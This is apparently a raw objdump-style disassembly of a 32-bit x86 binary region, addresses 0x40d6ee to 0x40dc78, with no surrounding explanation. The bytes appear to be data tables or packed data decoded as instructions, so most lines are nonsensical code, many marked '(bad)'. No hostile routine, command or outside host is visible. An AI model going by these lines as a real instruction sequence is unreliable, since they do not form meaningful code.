  40d6ee:	ab                   	stos   %eax,%es:(%edi)
  40d6ef:	d8 d8                	fcomp  %st(0)
  40d6f1:	73 62                	jae    0x40d755
  40d6f3:	31 31                	xor    %esi,(%ecx)
  40d6f5:	53                   	push   %ebx
  40d6f6:	2a 15 15 3f 08 04    	sub    0x4083f15,%dl
  40d6fc:	ff                   	(bad)
  40d6fd:	ff                   	(bad)
  40d6fe:	ff                   	(bad)
  40d6ff:	ff 04 0c             	incl   (%esp,%ecx,1)
  40d702:	95                   	xchg   %eax,%ebp
  40d703:	c7 c7 52 46 23 23    	mov    $0x23234652,%edi
  40d709:	65 9d                	gs popf
  40d70b:	c3                   	ret
  40d70c:	c3                   	ret
  40d70d:	5e                   	pop    %esi
  40d70e:	30 18                	xor    %bl,(%eax)
  40d710:	18 28                	sbb    %ch,(%eax)
  40d712:	37                   	aaa
  40d713:	96                   	xchg   %eax,%esi
  40d714:	96                   	xchg   %eax,%esi
  40d715:	a1 0a 05 05 0f       	mov    0xf05050a,%eax
  40d71a:	2f                   	das
  40d71b:	9a 9a b5 0e 07 ff ff 	lcall  $0xffff,$0x70eb59a
  40d722:	ff                   	(bad)
  40d723:	ff 07                	incl   (%edi)
  40d725:	09 24 12             	or     %esp,(%edx,%edx,1)
  40d728:	12 36                	adc    (%esi),%dh
  40d72a:	1b 80 80 9b df e2    	sbb    -0x1d206480(%eax),%eax
  40d730:	e2 3d                	loop   0x40d76f
  40d732:	cd eb                	int    $0xeb
  40d734:	eb 26                	jmp    0x40d75c
  40d736:	4e                   	dec    %esi
  40d737:	27                   	daa
  40d738:	27                   	daa
  40d739:	69 7f b2 b2 cd ea 75 	imul   $0x75eacdb2,-0x4e(%edi),%edi
  40d740:	75 9f                	jne    0x40d6e1
  40d742:	12 09                	adc    (%ecx),%cl
  40d744:	ff                   	(bad)
  40d745:	bf fd ff 09 1b       	mov    $0x1b09fffd,%edi
  40d74a:	1d 83 83 9e 58       	sbb    $0x589e8383,%eax
  40d74f:	2c 2c                	sub    $0x2c,%al
  40d751:	74 34                	je     0x40d787
  40d753:	1a 1a                	sbb    (%edx),%bl
  40d755:	2e 28 1b             	sub    %bl,%cs:(%ebx)
  40d758:	2d dc 6e 6e b2       	sub    $0xb26e6edc,%eax
  40d75d:	b4 5a                	mov    $0x5a,%ah
  40d75f:	5a                   	pop    %edx
  40d760:	ee                   	out    %al,(%dx)
  40d761:	5b                   	pop    %ebx
  40d762:	a0 a0 ff ff 17       	mov    0x17ffffa0,%al
  40d767:	fe                   	(bad)
  40d768:	fb                   	sti
  40d769:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40d76a:	52                   	push   %edx
  40d76b:	52                   	push   %edx
  40d76c:	f6 76 3b             	divb   0x3b(%esi)
  40d76f:	43                   	inc    %ebx
  40d770:	b7 d6                	mov    $0xd6,%bh
  40d772:	d6                   	salc
  40d773:	61                   	popa
  40d774:	7d b3                	jge    0x40d729
  40d776:	b3 ce                	mov    $0xce,%bl
  40d778:	52                   	push   %edx
  40d779:	29 29                	sub    %ebp,(%ecx)
  40d77b:	7b dd                	jnp    0x40d75a
  40d77d:	e3 e3                	jecxz  0x40d762
  40d77f:	3e 5e                	ds pop %esi
  40d781:	2f                   	das
  40d782:	ff                   	(bad)
  40d783:	3f                   	aas
  40d784:	fd                   	std
  40d785:	ff 2f                	ljmp   *(%edi)
  40d787:	71 13                	jno    0x40d79c
  40d789:	84 84 97 a6 53 53 f5 	test   %al,-0xaacac5a(%edi,%edx,4)
  40d790:	b9 d1 d1 68 4d       	mov    $0x4d68d1d1,%ecx
  40d795:	c1 ed ed             	shr    $0xed,%ebp
  40d798:	2c 40                	sub    $0x40,%al
  40d79a:	20 20                	and    %ah,(%eax)
  40d79c:	60                   	pusha
  40d79d:	e3 fc                	jecxz  0x40d79b
  40d79f:	fc                   	cld
  40d7a0:	ff                   	(bad)
  40d7a1:	ff                   	(bad)
  40d7a2:	ff                   	(bad)
  40d7a3:	ff 1f                	lcall  *(%edi)
  40d7a5:	79 b1                	jns    0x40d758
  40d7a7:	b1 c8                	mov    $0xc8,%cl
  40d7a9:	b6 5b                	mov    $0x5b,%dh
  40d7ab:	5b                   	pop    %ebx
  40d7ac:	ed                   	in     (%dx),%eax
  40d7ad:	d4 6a                	aam    $0x6a
  40d7af:	6a be                	push   $0xffffffbe
  40d7b1:	8d                   	lea    (bad),%ecx
  40d7b2:	cb                   	lret
  40d7b3:	cb                   	lret
  40d7b4:	46                   	inc    %esi
  40d7b5:	67 be be d9 72 39    	addr16 mov $0x3972d9be,%esi
  40d7bb:	39 4b 94             	cmp    %ecx,-0x6c(%ebx)
  40d7be:	4a                   	dec    %edx
  40d7bf:	4a                   	dec    %edx
  40d7c0:	de 98 4c 4c ff ff    	ficomps -0xb3b4(%eax)
  40d7c6:	ff                   	(bad)
  40d7c7:	ff d4                	call   *%esp
  40d7c9:	b0 58                	mov    $0x58,%al
  40d7cb:	58                   	pop    %eax
  40d7cc:	e8 85 cf cf 4a       	call   0x4b10a756
  40d7d1:	bb d0 d0 6b c5       	mov    $0xc56bd0d0,%ebx
  40d7d6:	ef                   	out    %eax,(%dx)
  40d7d7:	ef                   	out    %eax,(%dx)
  40d7d8:	2a 4f aa             	sub    -0x56(%edi),%cl
  40d7db:	aa                   	stos   %al,%es:(%edi)
  40d7dc:	e5 ed                	in     $0xed,%eax
  40d7de:	fb                   	sti
  40d7df:	fb                   	sti
  40d7e0:	16                   	push   %ss
  40d7e1:	86 43 43             	xchg   %al,0x43(%ebx)
  40d7e4:	c5 9a 4d 4d ff ff    	lds    -0xb2b3(%edx),%ebx
  40d7ea:	df fa                	(bad)
  40d7ec:	d7                   	xlat   %ds:(%ebx)
  40d7ed:	66 33 33             	xor    (%ebx),%si
  40d7f0:	55                   	push   %ebp
  40d7f1:	fc                   	cld
  40d7f2:	85 94 8a 45 45 cf e9 	test   %edx,-0x1630babb(%edx,%ecx,4)
  40d7f9:	f9                   	stc
  40d7fa:	f9                   	stc
  40d7fb:	10 04 02             	adc    %al,(%edx,%eax,1)
  40d7fe:	02 06                	add    (%esi),%al
  40d800:	fe                   	(bad)
  40d801:	7f 7f                	jg     0x40d882
  40d803:	81 a0 50 01 fd ff ff 	andl   $0x78f050ff,-0x2feb0(%eax)
  40d80a:	50 f0 78 
  40d80d:	3c 3c                	cmp    $0x3c,%al
  40d80f:	44                   	inc    %esp
  40d810:	25 9f 9f ba 4b       	and    $0x4bba9f9f,%eax
  40d815:	a8 a8                	test   $0xa8,%al
  40d817:	e3 a2                	jecxz  0x40d7bb
  40d819:	51                   	push   %ecx
  40d81a:	51                   	push   %ecx
  40d81b:	f3 5d                	repz pop %ebp
  40d81d:	a3 a3 fe fe ff       	mov    %eax,0xfffefea3
  40d822:	ff                   	(bad)
  40d823:	bf b7 c0 05 8f       	mov    $0x8f05c0b7,%edi
  40d828:	8f 8a 3f 92          	(bad)
  40d82c:	92                   	xchg   %eax,%edx
  40d82d:	ad                   	lods   %ds:(%esi),%eax
  40d82e:	21 9d 9d bc 70 38    	and    %ebx,0x3870bc9d(%ebp)
  40d834:	38 48 f1             	cmp    %cl,-0xf(%eax)
  40d837:	f5                   	cmc
  40d838:	f5                   	cmc
  40d839:	04 63                	add    $0x63,%al
  40d83b:	bc bc df 77 b6       	mov    $0xb677dfbc,%esp
  40d840:	b6 ff                	mov    $0xff,%dh
  40d842:	ff                   	(bad)
  40d843:	ff 37                	push   (%edi)
  40d845:	6e                   	outsb  %ds:(%esi),(%dx)
  40d846:	da da                	fcmovu %st(2),%st
  40d848:	75 42                	jne    0x40d88c
  40d84a:	21 21                	and    %esp,(%ecx)
  40d84c:	63 20                	arpl   %esp,(%eax)
  40d84e:	10 10                	adc    %dl,(%eax)
  40d850:	30 e5                	xor    %ah,%ch
  40d852:	ff                   	(bad)
  40d853:	ff 1a                	lcall  *(%edx)
  40d855:	fd                   	std
  40d856:	f3 f3 0e             	repz repz push %cs
  40d859:	bf d2 d2 6d 81       	mov    $0x816dd2d2,%edi
  40d85e:	cd cd                	int    $0xcd
  40d860:	ff                   	(bad)
  40d861:	ff                   	(bad)
  40d862:	ff                   	(bad)
  40d863:	ff 4c 18 0c          	decl   0xc(%eax,%ebx,1)
  40d867:	0c 14                	or     $0x14,%al
  40d869:	26 13 13             	adc    %es:(%ebx),%edx
  40d86c:	35 c3 ec ec 2f       	xor    $0x2fececc3,%eax
  40d871:	be 5f 5f e1 35       	mov    $0x35e15f5f,%esi
  40d876:	97                   	xchg   %eax,%edi
  40d877:	97                   	xchg   %eax,%edi
  40d878:	a2 88 44 44 cc       	mov    %al,0xcc444488
  40d87d:	2e 17                	cs pop %ss
  40d87f:	17                   	pop    %ss
  40d880:	39 93 c4 c4 8d ff    	cmp    %edx,-0x723b3c(%ebx)
  40d886:	ff                   	(bad)
  40d887:	ff 57 55             	call   *0x55(%edi)
  40d88a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d88b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d88c:	f2 fc                	repnz cld
  40d88e:	7e 7e                	jle    0x40d90e
  40d890:	82 7a 3d 3d          	cmpb   $0x3d,0x3d(%edx)
  40d894:	47                   	inc    %edi
  40d895:	c8 64 64 ac          	enter  $0x6464,$0xac
  40d899:	ba 5d 5d e7 32       	mov    $0x32e75d5d,%edx
  40d89e:	19 19                	sbb    %ebx,(%ecx)
  40d8a0:	2b ad ff 06 ff ff    	sub    -0xf901(%ebp),%ebp
  40d8a6:	73 95                	jae    0x40d83d
  40d8a8:	c0 60 60 a0          	shlb   $0xa0,0x60(%eax)
  40d8ac:	19 81 81 98 9e 4f    	sbb    %eax,0x4f9e9881(%ecx)
  40d8b2:	4f                   	dec    %edi
  40d8b3:	d1 a3 dc e2 44 22    	shll   $1,0x2244e2dc(%ebx)
  40d8b9:	22 66 54             	and    0x54(%esi),%ah
  40d8bc:	2a 2a                	sub    (%edx),%ch
  40d8be:	ff                   	(bad)
  40d8bf:	ff                   	(bad)
  40d8c0:	ff                   	(bad)
  40d8c1:	ff                   	(bad)
  40d8c2:	7e 3b                	jle    0x40d8ff
  40d8c4:	90                   	nop
  40d8c5:	90                   	nop
  40d8c6:	ab                   	stos   %eax,%es:(%edi)
  40d8c7:	0b 88 88 83 8c 46    	or     0x468c8388(%eax),%ecx
  40d8cd:	46                   	inc    %esi
  40d8ce:	ca c7 ee             	lret   $0xeec7
  40d8d1:	ee                   	out    %al,(%dx)
  40d8d2:	29 6b b8             	sub    %ebp,-0x48(%ebx)
  40d8d5:	b8 d3 28 14 14       	mov    $0x141428d3,%eax
  40d8da:	3c a7                	cmp    $0xa7,%al
  40d8dc:	de de                	(bad)
  40d8de:	79 bc                	jns    0x40d89c
  40d8e0:	5e                   	pop    %esi
  40d8e1:	5e                   	pop    %esi
  40d8e2:	ff 1b                	lcall  *(%ebx)
  40d8e4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d8e5:	ff e2                	jmp    *%edx
  40d8e7:	16                   	push   %ss
  40d8e8:	0b 0b                	or     (%ebx),%ecx
  40d8ea:	1d ad db db 76       	sbb    $0x76dbdbad,%eax
  40d8ef:	e0 a0                	loopne 0x40d891
  40d8f1:	64 32 32             	xor    %fs:(%edx),%dh
  40d8f4:	56                   	push   %esi
  40d8f5:	74 3a                	je     0x40d931
  40d8f7:	3a 4e 14             	cmp    0x14(%esi),%cl
  40d8fa:	ff                   	(bad)
  40d8fb:	ff                   	(bad)
  40d8fc:	ff                   	(bad)
  40d8fd:	ff 0a                	decl   (%edx)
  40d8ff:	0a 1e                	or     (%esi),%bl
  40d901:	92                   	xchg   %eax,%edx
  40d902:	49                   	dec    %ecx
  40d903:	49                   	dec    %ecx
  40d904:	db 0c 06             	fisttpl (%esi,%eax,1)
  40d907:	06                   	push   %es
  40d908:	0a 48 24             	or     0x24(%eax),%cl
  40d90b:	24 6c                	and    $0x6c,%al
  40d90d:	b8 5c 5c e4 9f       	mov    $0x9fe45c5c,%eax
  40d912:	c2 c2 5d             	ret    $0x5dc2
  40d915:	bd d3 d3 6e 43       	mov    $0x436ed3d3,%ebp
  40d91a:	ac                   	lods   %ds:(%esi),%al
  40d91b:	ac                   	lods   %ds:(%esi),%al
  40d91c:	ef                   	out    %eax,(%dx)
  40d91d:	c4 7f fb             	les    -0x5(%edi),%edi
  40d920:	ff                   	(bad)
  40d921:	ff 62 62             	jmp    *0x62(%edx)
  40d924:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40d925:	39 91 91 a8 31 95    	cmp    %edx,-0x6ace576f(%ecx)
  40d92b:	95                   	xchg   %eax,%ebp
  40d92c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40d92d:	d3 e4                	shl    %cl,%esp
  40d92f:	e4 37                	in     $0x37,%al
  40d931:	f2 79 79             	bnd jns 0x40d9ad
  40d934:	8b d5                	mov    %ebp,%edx
  40d936:	e7 8a                	out    %eax,$0x8a
  40d938:	8b c8                	mov    %eax,%ecx
  40d93a:	c8 43 6e 37          	enter  $0x6e43,$0x37
  40d93e:	ff                   	(bad)
  40d93f:	ff                   	(bad)
  40d940:	ff                   	(bad)
  40d941:	ff 37                	push   (%edi)
  40d943:	59                   	pop    %ecx
  40d944:	da 6d 6d             	fisubrl 0x6d(%ebp)
  40d947:	b7 01                	mov    $0x1,%bh
  40d949:	8d 8d 8c b1 d5 d5    	lea    -0x2a2a4e74(%ebp),%ecx
  40d94f:	64 9c                	fs pushf
  40d951:	4e                   	dec    %esi
  40d952:	4e                   	dec    %esi
  40d953:	d2 49 a9             	rorb   %cl,-0x57(%ecx)
  40d956:	a9 e0 d8 6c 6c       	test   $0x6c6cd8e0,%eax
  40d95b:	b4 ac                	mov    $0xac,%ah
  40d95d:	56                   	push   %esi
  40d95e:	56                   	push   %esi
  40d95f:	fa                   	cli
  40d960:	f3 f4                	repz hlt
  40d962:	fe                   	(bad)
  40d963:	df f8                	(bad)
  40d965:	ff f4                	push   %esp
  40d967:	07                   	pop    %es
  40d968:	cf                   	iret
  40d969:	ea ea 25 ca 65 65 af 	ljmp   $0xaf65,$0x65ca25ea
  40d970:	f4                   	hlt
  40d971:	7a 7a                	jp     0x40d9ed
  40d973:	9e                   	sahf
  40d974:	ae                   	scas   %es:(%edi),%al
  40d975:	ae                   	scas   %es:(%edi),%al
  40d976:	e9 10 08 08 18       	jmp    0x1848e18b
  40d97b:	6f                   	outsl  %ds:(%esi),(%dx)
  40d97c:	ba ba d5 ff ff       	mov    $0xffffd5ba,%edx
  40d981:	ff 17                	call   *(%edi)
  40d983:	50                   	push   %eax
  40d984:	78 88                	js     0x40d90e
  40d986:	4a                   	dec    %edx
  40d987:	25 25 6f 5c 2e       	and    $0x2e5c6f25,%eax
  40d98c:	2e 72 38             	jb,pn  0x40d9c7
  40d98f:	1c 1c                	sbb    $0x1c,%al
  40d991:	24 57                	and    $0x57,%al
  40d993:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40d994:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40d995:	f1                   	int1
  40d996:	73 b4                	jae    0x40d94c
  40d998:	b4 c7                	mov    $0xc7,%ah
  40d99a:	97                   	xchg   %eax,%edi
  40d99b:	c6 c6 51             	mov    $0x51,%dh
  40d99e:	ff                   	(bad)
  40d99f:	ff                   	(bad)
  40d9a0:	ff                   	(bad)
  40d9a1:	ff cb                	dec    %ebx
  40d9a3:	e8 e8 23 a1 dd       	call   0xdde1fd90
  40d9a8:	dd 7c e8 74          	fnstsw 0x74(%eax,%ebp,8)
  40d9ac:	74 9c                	je     0x40d94a
  40d9ae:	3e 1f                	ds pop %ds
  40d9b0:	1f                   	pop    %ds
  40d9b1:	21 96 4b 4b dd 61    	and    %edx,0x61dd4b4b(%esi)
  40d9b7:	bd bd dc 0d 8b       	mov    $0x8b0ddcbd,%ebp
  40d9bc:	8b 86 0f 8a 8a 85    	mov    -0x7a7575f1(%esi),%eax
  40d9c2:	ff                   	(bad)
  40d9c3:	ff                   	(bad)
  40d9c4:	ff                   	(bad)
  40d9c5:	ff e0                	jmp    *%eax
  40d9c7:	70 70                	jo     0x40da39
  40d9c9:	90                   	nop
  40d9ca:	7c 3e                	jl     0x40da0a
  40d9cc:	3e 42                	ds inc %edx
  40d9ce:	71 b5                	jno    0x40d985
  40d9d0:	b5 c4                	mov    $0xc4,%ch
  40d9d2:	cc                   	int3
  40d9d3:	66 66 aa             	data16 data16 stos %al,%es:(%edi)
  40d9d6:	90                   	nop
  40d9d7:	48                   	dec    %eax
  40d9d8:	48                   	dec    %eax
  40d9d9:	d8 06                	fadds  (%esi)
  40d9db:	03 03                	add    (%ebx),%eax
  40d9dd:	05 f7 f6 f6 01       	add    $0x1f6f6f7,%eax
  40d9e2:	1c 0e                	sbb    $0xe,%al
  40d9e4:	0e                   	push   %cs
  40d9e5:	12 12                	adc    (%edx),%dl
  40d9e7:	ff                   	(bad)
  40d9e8:	ff                   	(bad)
  40d9e9:	ff c2                	inc    %edx
  40d9eb:	61                   	popa
  40d9ec:	61                   	popa
  40d9ed:	a3 6a 35 35 5f       	mov    %eax,0x5f35356a
  40d9f2:	ae                   	scas   %es:(%edi),%al
  40d9f3:	57                   	push   %edi
  40d9f4:	57                   	push   %edi
  40d9f5:	f9                   	stc
  40d9f6:	69 b9 b9 d0 17 86 86 	imul   $0xc1999186,-0x79e82f47(%ecx),%edi
  40d9fd:	91 99 c1 
  40da00:	c1 58 3b ff          	rcrl   $0xff,0x3b(%eax)
  40da04:	ff                   	(bad)
  40da05:	ff c6                	inc    %esi
  40da07:	1d 85 9e 9e b9       	sbb    $0xb99e9e85,%eax
  40da0c:	d9 e1                	fabs
  40da0e:	e1 38                	loope  0x40da48
  40da10:	eb f8                	jmp    0x40da0a
  40da12:	f8                   	clc
  40da13:	13 2b                	adc    (%ebx),%ebp
  40da15:	98                   	cwtl
  40da16:	98                   	cwtl
  40da17:	b3 22                	mov    $0x22,%bl
  40da19:	11 11                	adc    %edx,(%ecx)
  40da1b:	33 d2                	xor    %edx,%edx
  40da1d:	69 69 bb ff ff ff ff 	imul   $0xffffffff,-0x45(%ecx),%ebp
  40da24:	a9 d9 d9 70 07       	test   $0x770d9d9,%eax
  40da29:	8e 8e 89 33 94 94    	mov    -0x6b6bcc77(%esi),%cs
  40da2f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40da30:	2d 9b 9b b6 3c       	sub    $0x3cb69b9b,%eax
  40da35:	1e                   	push   %ds
  40da36:	1e                   	push   %ds
  40da37:	22 15 87 87 92 c9    	and    0xc9928787,%dl
  40da3d:	e9 e9 20 87 ce       	jmp    0xcec7fb2b
  40da42:	ce                   	into
  40da43:	49                   	dec    %ecx
  40da44:	f8                   	clc
  40da45:	ff                   	(bad)
  40da46:	ff                   	(bad)
  40da47:	ff aa 55 55 ff 50    	ljmp   *0x50ff5555(%edx)
  40da4d:	28 28                	sub    %ch,(%eax)
  40da4f:	78 a5                	js     0x40d9f6
  40da51:	df df                	(bad)
  40da53:	7a 03                	jp     0x40da58
  40da55:	8c 8c 8f 59 a1 a1 f8 	mov    %cs,-0x75e5ea7(%edi,%ecx,4)
  40da5c:	09 89 89 80 1a 0d    	or     %ecx,0xd1a8089(%ecx)
  40da62:	0d 17 65 ff ff       	or     $0xffff6517,%eax
  40da67:	ff 37                	push   (%edi)
  40da69:	f6 da                	neg    %dl
  40da6b:	d7                   	xlat   %ds:(%ebx)
  40da6c:	e6 e6                	out    %al,$0xe6
  40da6e:	31 84 42 42 c6 d0 68 	xor    %eax,0x68d0c642(%edx,%eax,2)
  40da75:	68 b8 82 41 41       	push   $0x414182b8
  40da7a:	c3                   	ret
  40da7b:	29 99 99 b0 5a 2d    	sub    %ebx,0x2d5ab099(%ecx)
  40da81:	2d 77 1e d3 f5       	sub    $0xf5d31e77,%eax
  40da86:	ff                   	(bad)
  40da87:	ff 0f                	decl   (%edi)
  40da89:	0f 11 7b b0          	movups %xmm7,-0x50(%ebx)
  40da8d:	b0 cb                	mov    $0xcb,%al
  40da8f:	a8 54                	test   $0x54,%al
  40da91:	54                   	push   %esp
  40da92:	fc                   	cld
  40da93:	6d                   	insl   (%dx),%es:(%edi)
  40da94:	bb bb d6 2c 16       	mov    $0x162cd6bb,%ebx
  40da99:	16                   	push   %ss
  40da9a:	3a a5 00 84 4d d3    	cmp    -0x2cb27c00(%ebp),%ah
  40daa0:	34 4d                	xor    $0x4d,%al
  40daa2:	99                   	cltd
  40daa3:	8d 0d bd b1 54 34    	lea    0x3454b1bd,%ecx
  40daa9:	4d                   	dec    %ebp
  40daaa:	d3 34 50             	shll   %cl,(%eax,%edx,2)
  40daad:	03 a9 7d 19 d3 34    	add    0x34d3197d(%ecx),%ebp
  40dab3:	4d                   	dec    %ebp
  40dab4:	d3 62 e6             	shll   %cl,-0x1a(%edx)
  40dab7:	9a 45 9d 4d d3 34 4d 	lcall  $0x4d34,$0xd34d9d45
  40dabe:	40                   	inc    %eax
  40dabf:	87 15 eb c9 0b 34    	xchg   %edx,0x340bc9eb
  40dac5:	4d                   	dec    %ebp
  40dac6:	d3 34 ec             	shll   %cl,(%esp,%ebp,8)
  40dac9:	67 fd                	addr16 std
  40dacb:	ea bf d3 34 4d d3 f7 	ljmp   $0xf7d3,$0x4d34d3bf
  40dad2:	96                   	xchg   %eax,%esi
  40dad3:	5b                   	pop    %ebx
  40dad4:	c2 1c 4d             	ret    $0x4d1c
  40dad7:	d3 34 4d ae 6a 5a 41 	shll   %cl,0x415a6aae(,%ecx,2)
  40dade:	02 4f 34             	add    0x34(%edi),%cl
  40dae1:	4d                   	dec    %ebp
  40dae2:	d3 34 5c             	shll   %cl,(%esp,%ebx,2)
  40dae5:	f4                   	hlt
  40dae6:	34 08                	xor    $0x8,%al
  40dae8:	93                   	xchg   %eax,%ebx
  40dae9:	d3 34 4d d3 73 53 3f 	shll   %cl,0x3f5373d3(,%ecx,2)
  40daf0:	0c 52                	or     $0x52,%al
  40daf2:	4d                   	dec    %ebp
  40daf3:	d3 34 4d 65 5e 28 a1 	shll   %cl,-0x5ed7a19b(,%ecx,2)
  40dafa:	0f b5 34 4d d3 34 09 	lgs    0x360934d3(,%ecx,2),%esi
  40db01:	36 
  40db02:	9b                   	fwait
  40db03:	3d 26 d3 34 4d       	cmp    $0x4d34d326,%eax
  40db08:	d3 69 cd             	shrl   %cl,-0x33(%ecx)
  40db0b:	9f                   	lahf
  40db0c:	1b 9e 4d d3 34 4d    	sbb    0x4d34d34d(%esi),%ebx
  40db12:	74 2e                	je     0x40db42
  40db14:	2d b2 ee fb 34       	sub    $0x34fbeeb2,%eax
  40db19:	4d                   	dec    %ebp
  40db1a:	d3 34 f6             	shll   %cl,(%esi,%esi,8)
  40db1d:	4d                   	dec    %ebp
  40db1e:	61                   	popa
  40db1f:	ce                   	into
  40db20:	7b d3                	jnp    0x40daf5
  40db22:	34 4d                	xor    $0x4d,%al
  40db24:	d3 3e                	sarl   %cl,(%esi)
  40db26:	71 97                	jno    0x40dabf
  40db28:	f5                   	cmc
  40db29:	68 4d d3 34 4d       	push   $0x4d34d34d
  40db2e:	00 2c 60             	add    %ch,(%eax,%eiz,2)
  40db31:	1f                   	pop    %ds
  40db32:	c8 ed 34 4d          	enter  $0x34ed,$0x4d
  40db36:	d3 34 be             	shll   %cl,(%esi,%edi,4)
  40db39:	46                   	inc    %esi
  40db3a:	d9 4b de             	(bad) -0x22(%ebx)
  40db3d:	d3 34 4d d3 d4 e8 4a 	shll   %cl,0x4ae8d4d3(,%ecx,2)
  40db44:	6b 2a 4d             	imul   $0x4d,(%edx),%ebp
  40db47:	d3 34 4d e5 16 c5 d7 	shll   %cl,-0x283ae91b(,%ecx,2)
  40db4e:	55                   	push   %ebp
  40db4f:	94                   	xchg   %eax,%esp
  40db50:	34 4d                	xor    $0x4d,%al
  40db52:	d3 34 cf             	shll   %cl,(%edi,%ecx,8)
  40db55:	10 06                	adc    %al,(%esi)
  40db57:	81 f0 d3 34 4d d3    	xor    $0xd34d34d3,%eax
  40db5d:	44                   	inc    %esp
  40db5e:	ba e3 f3 fe 4d       	mov    $0x4dfef3e3,%edx
  40db63:	d3 34 4d c0 8a ad bc 	shll   %cl,-0x43527540(,%ecx,2)
  40db6a:	48                   	dec    %eax
  40db6b:	04 34                	add    $0x34,%al
  40db6d:	4d                   	dec    %ebp
  40db6e:	d3 34 df             	shll   %cl,(%edi,%ebx,8)
  40db71:	c1 75 63 30          	shll   $0x30,0x63(%ebp)
  40db75:	d3 34 4d d3 1a 0e 6d 	shll   %cl,0x6d0e1ad3(,%ecx,2)
  40db7c:	4c                   	dec    %esp
  40db7d:	14 4d                	adc    $0x4d,%al
  40db7f:	d3 34 4d 35 2f e1 a2 	shll   %cl,-0x5d1ed0cb(,%ecx,2)
  40db86:	cc                   	int3
  40db87:	39 34 4d d3 34 57 f2 	cmp    %esi,-0xda8cb2d(,%ecx,2)
  40db8e:	82 47 ac d3          	addb   $0xd3,-0x54(%edi)
  40db92:	34 4d                	xor    $0x4d,%al
  40db94:	d3 e7                	shl    %cl,%edi
  40db96:	2b 95 a0 98 4d d3    	sub    -0x2cb26760(%ebp),%edx
  40db9c:	34 4d                	xor    $0x4d,%al
  40db9e:	d1 7f 66             	sarl   $1,0x66(%edi)
  40dba1:	7e ab                	jle    0x40db4e
  40dba3:	83 34 4d d3 34 ca 29 	xorl   $0xffffffd3,0x29ca34d3(,%ecx,2)
  40dbaa:	d3 
  40dbab:	3c 79                	cmp    $0x79,%al
  40dbad:	d3 34 4d d3 e2 1d 76 	shll   %cl,0x761de2d3(,%ecx,2)
  40dbb4:	3b 56 4d             	cmp    0x4d(%esi),%edx
  40dbb7:	d3 34 4d 4e 1e db 0a 	shll   %cl,0xadb1e4e(,%ecx,2)
  40dbbe:	6c                   	insb   (%dx),%es:(%edi)
  40dbbf:	e4 34                	in     $0x34,%al
  40dbc1:	4d                   	dec    %ebp
  40dbc2:	d3 34 5d 6e ef a6 a8 	shll   %cl,-0x57591092(,%ebx,2)
  40dbc9:	d3 34 4d d3 a4 37 8b 	shll   %cl,-0x74c85b2d(,%ecx,2)
  40dbd0:	32 43 4d             	xor    0x4d(%ebx),%al
  40dbd3:	d3 34 4d 59 b7 8c 64 	shll   %cl,0x648cb759(,%ecx,2)
  40dbda:	d2 e0                	shl    %cl,%al
  40dbdc:	34 4d                	xor    $0x4d,%al
  40dbde:	d3 34 b4             	shll   %cl,(%esp,%esi,4)
  40dbe1:	fa                   	cli
  40dbe2:	07                   	pop    %es
  40dbe3:	25 af d3 34 4d       	and    $0x4d34d3af,%eax
  40dbe8:	d3 8e e9 18 d5 88    	rorl   %cl,-0x772ae717(%esi)
  40dbee:	4d                   	dec    %ebp
  40dbef:	d3 34 4d 6f 72 24 f1 	shll   %cl,-0xedb8d91(,%ecx,2)
  40dbf6:	c7                   	(bad)
  40dbf7:	51                   	push   %ecx
  40dbf8:	34 4d                	xor    $0x4d,%al
  40dbfa:	d3 34 23             	shll   %cl,(%ebx,%eiz,1)
  40dbfd:	7c 9c                	jl     0x40db9b
  40dbff:	21 dd                	and    %ebx,%ebp
  40dc01:	d3 34 4d d3 dc 86 85 	shll   %cl,-0x7a79232d(,%ecx,2)
  40dc08:	90                   	nop
  40dc09:	42                   	inc    %edx
  40dc0a:	4d                   	dec    %ebp
  40dc0b:	d3 34 4d c4 aa d8 05 	shll   %cl,0x5d8aac4(,%ecx,2)
  40dc12:	01 12                	add    %edx,(%edx)
  40dc14:	34 4d                	xor    $0x4d,%al
  40dc16:	d3 34 a3             	shll   %cl,(%ebx,%eiz,4)
  40dc19:	5f                   	pop    %edi
  40dc1a:	f9                   	stc
  40dc1b:	d0 91 d3 34 4d d3    	rclb   $1,-0x2cb2cb2d(%ecx)
  40dc21:	58                   	pop    %eax
  40dc22:	27                   	daa
  40dc23:	b9 38 13 4d d3       	mov    $0xd34d1338,%ecx
  40dc28:	34 4d                	xor    $0x4d,%al
  40dc2a:	b3 33                	mov    $0x33,%bl
  40dc2c:	bb 70 89 a7 34       	mov    $0x34a78970,%ebx
  40dc31:	4d                   	dec    %ebp
  40dc32:	d3 34 b6             	shll   %cl,(%esi,%esi,4)
  40dc35:	22 92 20 49 d3 34    	and    0x34d34920(%edx),%dl
  40dc3b:	4d                   	dec    %ebp
  40dc3c:	d3 ff                	sar    %cl,%edi
  40dc3e:	78 7a                	js     0x40dcba
  40dc40:	8f                   	(bad)
  40dc41:	f8                   	clc
  40dc42:	4d                   	dec    %ebp
  40dc43:	d3 34 4d 80 17 da 31 	shll   %cl,0x31da1780(,%ecx,2)
  40dc4a:	c6 b8                	xabort $0xb8,(bad)
  40dc4c:	34 4d                	xor    $0x4d,%al
  40dc4e:	d3 34 c3             	shll   %cl,(%ebx,%eax,8)
  40dc51:	b0 77                	mov    $0x77,%al
  40dc53:	11 cb                	adc    %ecx,%ebx
  40dc55:	d3 34 4d d3 fc d6 3a 	shll   %cl,0x3ad6fcd3(,%ecx,2)
  40dc5c:	63 7c 4d d3          	arpl   %edi,-0x2d(%ebp,%ecx,2)
  40dc60:	34 4d                	xor    $0x4d,%al
  40dc62:	77 7b                	ja     0x40dcdf
  40dc64:	f2 6b 6f c5 34       	repnz imul $0x34,-0x3b(%edi),%ebp
  40dc69:	4d                   	dec    %ebp
  40dc6a:	d3 34 30             	shll   %cl,(%eax,%esi,1)
  40dc6d:	01 67 2b             	add    %esp,0x2b(%edi)
  40dc70:	fe                   	(bad)
  40dc71:	d3 34 4d d3 d7 ab 76 	shll   %cl,0x76abd7d3(,%ecx,2)
  40dc78:	ca 82 4d             	lret   $0x4d82
